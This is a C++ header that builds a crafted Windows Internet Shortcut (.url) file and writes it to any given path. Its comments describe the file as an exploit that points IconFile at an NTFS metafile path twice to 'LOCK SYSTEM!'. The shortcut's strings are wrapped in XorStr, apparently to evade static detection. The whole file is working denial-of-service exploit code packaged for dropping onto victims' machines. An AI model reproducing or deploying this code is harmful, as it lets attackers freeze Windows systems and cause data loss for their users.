#ifndef _H_DROPFREEZEFILE
#define _H_DROPFREEZEFILE

#ifdef _MSC_VER
#pragma once
#endif


#include "BaseIncludes.h"



inline std::string GetFreezeFileContents()
{
	// ehhh not the proper way, but better code looking way...
	std::string explt;
	explt.append(XorStr("Prop3=19,3\n"));
	explt.append(XorStr("[[InternetShortcut]]\n"));
	explt.append(XorStr("IDList=\n"));
	// run cmd.exe as ref
	explt.append(XorStr("URL=file:///c:/windows/system32/cmd.exe\n"));	
	explt.append(XorStr("HotKey=0\n"));
	explt.append(XorStr("IconIndex=0\n"));
	// open apc queue once
	explt.append(XorStr("IconFile=C:\\$Secure:$ATTRIBUTE_LIST:$ATTRIBUTE_LIST\n"));
	explt.append(XorStr("[[InternetShortcut.A]]\n"));
	explt.append(XorStr("[[InternetShortcut.W]]\n"));
	// open apc queue twice, LOCK SYSTEM!
	explt.append(XorStr("IconFile=C:\\$Secure:$ATTRIBUTE_LIST:$ATTRIBUTE_LIST\n"));
	return explt;
}



inline bool DropFreezeFileAt(const char* pszPath)
{
	std::ofstream f(pszPath, std::ios::out);

	if (!f.is_open())
		return false;

	std::string explt = GetFreezeFileContents();
	f.write(explt.c_str(), explt.length());
	f.close();
	return true;
}


#endif
